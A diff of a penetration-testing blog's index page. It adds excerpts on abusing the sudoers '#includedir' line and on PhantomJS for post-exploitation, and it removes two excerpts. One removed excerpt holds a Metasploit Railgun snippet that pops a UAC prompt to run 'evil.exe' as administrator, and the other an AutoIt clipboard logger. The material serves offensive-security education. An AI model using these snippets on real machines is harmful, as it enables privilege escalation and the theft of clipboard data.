@@ -219,6 +219,76 @@
     
       <article>
   <header>
+    <h2><a href="//room362.com/post/2012/2012-05-26-sudoers-commented-includes-used-for-evil/">SUDOERS Commented Includes used for Evil</a></h2>
+
+    <div class="post-meta">
+
+  <div>
+    <i class="fa fa-calendar fa-fw"></i>
+    <time>26 May 2012, 05:33</time>
+  </div>
+
+  
+
+  
+
+  
+
+</div>
+
+  </header>
+
+  <p>
+  I found a number of things interesting when reading the following post: http://www.offensive-security.com/vulndev/freepbx-exploit-phone-home/ Too bad that nmap&rsquo;s interactive mode was taken out, but there are a great number of other such methods, most notably VI&rsquo;s shell mode. But when I started looking into appending or inserting lines into /etc/sudoers for CCDC, I happened upon an interesting function of that file. Near the end of the file there are two lines: # See sudoers(5) for more information on &quot;#include&quot; directives: #includedir /etc/sudoers.d Both look commented out, but in actuality, exactly as-is the #includedir line is interpreted and acted upon.
+  </p>
+
+  
+  <footer>
+    <a href="/post/2012/2012-05-26-sudoers-commented-includes-used-for-evil/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
+  </footer>
+  
+</article>
+
+    
+  
+    
+      <article>
+  <header>
+    <h2><a href="//room362.com/post/2012/2012-05-25-post-exploitation-with-phantomjs/">Post Exploitation with PhantomJS</a></h2>
+
+    <div class="post-meta">
+
+  <div>
+    <i class="fa fa-calendar fa-fw"></i>
+    <time>25 May 2012, 05:36</time>
+  </div>
+
+  
+
+  
+
+  
+
+</div>
+
+  </header>
+
+  <p>
+  If you have never heard of PhantomJS ( http://phantomjs.org/ ) before, it&rsquo;s a &ldquo;Full Web Stack with No Browser Required&rdquo;, basically it a GUI-less browser. One of the magical &ldquo;example&rdquo; files that it has is called &ldquo;rasterize.js&rdquo; Rasterize.JS essentially renders a URL, screen shots it and give it to you in a number of different formats, here&rsquo;s it&rsquo;s usage: Usage: rasterize.js URL filename [paperwidth*paperheight|paperformat] paper (pdf output) examples: &quot;5in*7.5in&quot;, &quot;10cm*20cm&quot;, &quot;A4&quot;, &quot;Letter&quot; PhantomJS is sweet for sweeping a ton of IPs and suspected HTTP/S sites, and look through a gallery of them to start figuring out which looks the most interesting… and we are going to essentially just that, except from a Victim machine.
+  </p>
+
+  
+  <footer>
+    <a href="/post/2012/2012-05-25-post-exploitation-with-phantomjs/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
+  </footer>
+  
+</article>
+
+    
+  
+    
+      <article>
+  <header>
     <h2><a href="//room362.com/post/2012/2012-05-24-sticky-keys-and-utilman-against-nla/">Sticky Keys and Utilman against NLA</a></h2>
 
     <div class="post-meta">
@@ -471,76 +541,6 @@
   This is my talk that I gave at ShmooCon 2012. It was a great honor to be given the chance to speak at ShmooCon as it has been my second home since 2006 (missed the first one&hellip; havent missed one since) A @textfiles approach to gathering the world&#x27;s DNS from Rob Fuller
   </p>
 
-  
-</article>
-
-    
-  
-    
-      <article>
-  <header>
-    <h2><a href="//room362.com/post/2012/2012-01-03-uac-user-assisted-compromise/">(UAC) User Assisted Compromise</a></h2>
-
-    <div class="post-meta">
-
-  <div>
-    <i class="fa fa-calendar fa-fw"></i>
-    <time>03 Jan 2012, 06:56</time>
-  </div>
-
-  
-
-  
-
-  
-
-</div>
-
-  </header>
-
-  <p>
-  A number of times during tests I&rsquo;ve actually run into those mythical creatures called &ldquo;patched windows machines&rdquo;. At DerbyCon Chris Gates and I released the &ldquo;Ask&rdquo; post module (which I had failed to publish). This module very simply uses the ShellExecute windows function.aspx&rdquo;) via Railgun with the undocumented (but very well known) operator of &lsquo;runas&rsquo;. These two lines accomplished that: client.railgun.add_function( 'shell32', 'ShellExecuteA', 'DWORD',[[&quot;DWORD&quot;,&quot;hwnd&quot;,&quot;in&quot;],[&quot;PCHAR&quot;,&quot;lpOperation&quot;,&quot;in&quot;],[&quot;PCHAR&quot;,&quot;lpFile&quot;,&quot;in&quot;],[&quot;PCHAR&quot;,&quot;lpParameters&quot;,&quot;in&quot;],[&quot;PCHAR&quot;,&quot;lpDirectory&quot;,&quot;in&quot;],[&quot;DWORD&quot;,&quot;nShowCmd&quot;,&quot;in&quot;],]) client.railgun.shell32.ShellExecuteA(nil,&quot;runas&quot;,&quot;evil.exe&quot;,nil,nil,5) This would quite simply prompt the user with that annoying UAC prompt asking the user to run &lsquo;evil.exe&rsquo; with Administrative privs.
-  </p>
-
-  
-  <footer>
-    <a href="/post/2012/2012-01-03-uac-user-assisted-compromise/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
-  </footer>
-  
-</article>
-
-    
-  
-    
-      <article>
-  <header>
-    <h2><a href="//room362.com/post/2011/2011-12-26-hak5-segment-sneak-peak/">Hak5 Segment Sneak Peak</a></h2>
-
-    <div class="post-meta">
-
-  <div>
-    <i class="fa fa-calendar fa-fw"></i>
-    <time>26 Dec 2011, 06:06</time>
-  </div>
-
-  
-
-  
-
-  
-
-</div>
-
-  </header>
-
-  <p>
-  Since it&rsquo;s Christmas and all, I thought I&rsquo;d post the code snippet from my Hak5 segment a bit early: #include &lt;Clipboard.au3&gt; #include &lt;File.au3&gt; $oldclip = &quot;&quot; While 1 $clip = _ClipBoard_GetData() If $clip &lt;&gt; &quot;0&quot; Then If $clip &lt;&gt; $oldclip Then _FileWriteLog(@UserProfileDir &amp; &quot;clip.log&quot;, $clip) $oldclip = $clip EndIf EndIf Sleep(100) WEnd It&rsquo;s pretty straight forward, and I welcome everyone to install AutoIt3 and compile/run the above script to see what it does (although most of you I&rsquo;m sure can figure it out just by reading it).
-  </p>
-
-  
-  <footer>
-    <a href="/post/2011/2011-12-26-hak5-segment-sneak-peak/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
-  </footer>
   
 </article>
 
